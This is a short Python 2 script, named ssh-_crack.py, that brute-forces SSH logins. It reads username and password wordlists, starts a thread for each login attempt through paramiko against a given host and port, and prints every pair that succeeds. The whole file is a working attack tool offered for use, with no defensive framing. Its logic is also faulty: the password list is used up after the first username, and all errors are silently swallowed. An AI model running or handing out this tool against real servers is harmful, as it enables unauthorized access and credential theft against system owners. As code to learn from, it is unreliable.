#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Time   :  18-6-24 上午12:18
# Author :  xiaodong
# File   :  ssh-_crack.py

import paramiko

import threading

import argparse


def sshcrack(host,port,username,password):
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        ssh.connect(host,port,username,password)
        ssh.close()
        print "succeed host {} username {} password {}".format(host,username,password)
    except:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host',help='host')
    parser.add_argument('port',help='port')
    parser.add_argument('userdic',help='userdic eg user.txt',type=str)
    parser.add_argument('passdic',help='passlist eg:pass.txt',type=str)
    args = parser.parse_args()

    host = args.host
    port = args.port

    userfile = args.userdic
    passfile = args.passdic

    ufile= open(userfile,'r')
    pfile= open(passfile,'r')
    for line in ufile.readlines():
        username = line.strip()
        for line in pfile.readlines():
            password = line.strip()

            t = threading.Thread(target=sshcrack,args=(host,port,username,password))
            t.start()
if __name__ == "__main__":
    main()

